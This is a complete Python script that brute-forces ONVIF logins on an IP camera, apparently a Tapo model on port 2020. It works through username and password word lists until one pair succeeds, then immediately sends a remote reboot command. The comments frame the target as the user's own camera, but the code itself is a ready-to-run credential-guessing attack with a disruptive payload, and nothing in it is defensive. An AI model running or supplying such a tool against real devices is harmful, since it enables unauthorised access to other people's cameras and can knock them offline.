from onvif import ONVIFCamera
import sys
import time

# --- CONFIGURATION ---
YOUR_IP = '192.168.0.100'  # Your camera's IP address
YOUR_PORT = 2020           # Tapo's ONVIF port is 2020
USER_FILE = 'user.txt'    # File with usernames, one per line
PASS_FILE = 'pass.txt'  # File with passwords, one per line
# ---------------------

def try_reboot(ip, port, username, password):
    """
    Tries to connect with a single username/password and reboot.
    Returns True on success, False on failure.
    """
    try:
        print(f"[*] Trying: {username}:{password}")
        mycam = ONVIFCamera(ip, port, username, password)
        
        # If we get here, connection worked
        print(f"\n[+] SUCCESS! Valid credentials found: {username}:{password}\n")
        
        device_service = mycam.create_devicemgmt_service()
        print("--- Sending REBOOT command ---")
        device_service.SystemReboot()
        print("Reboot command sent successfully.")
        return True # Signal that we succeeded
        
    except Exception as e:
        # This will catch login errors, timeouts, etc.
        print(f"[-] FAILED: {str(e)}\n")
        return False # Signal that we failed

def read_file_to_list(filename):
    """Helper function to read a file into a list."""
    try:
        with open(filename, 'r') as f:
            # .strip() removes the newline character ('\n')
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[!] Error: File not found: {filename}")
        return []

def main():
    print(f"Loading users from {USER_FILE}...")
    users = read_file_to_list(USER_FILE)
    print(f"Loading passwords from {PASS_FILE}...")
    passwords = read_file_to_list(PASS_FILE)

    if not users or not passwords:
        print("Error: User or password file is empty or missing. Exiting.")
        sys.exit(1)
        
    print(f"--- Starting brute-force attempt on {YOUR_IP} ---")
    
    # This is a nested loop. It tries every password for each user.
    for user in users:
        for pwd in passwords:
            if try_reboot(YOUR_IP, YOUR_PORT, user, pwd):
                # If the reboot was successful, stop everything
                print("--- Task complete. Valid credentials found. ---")
                return # Exit the main function
                
    print("--- All combinations failed. ---")

if __name__ == '__main__':
    main()
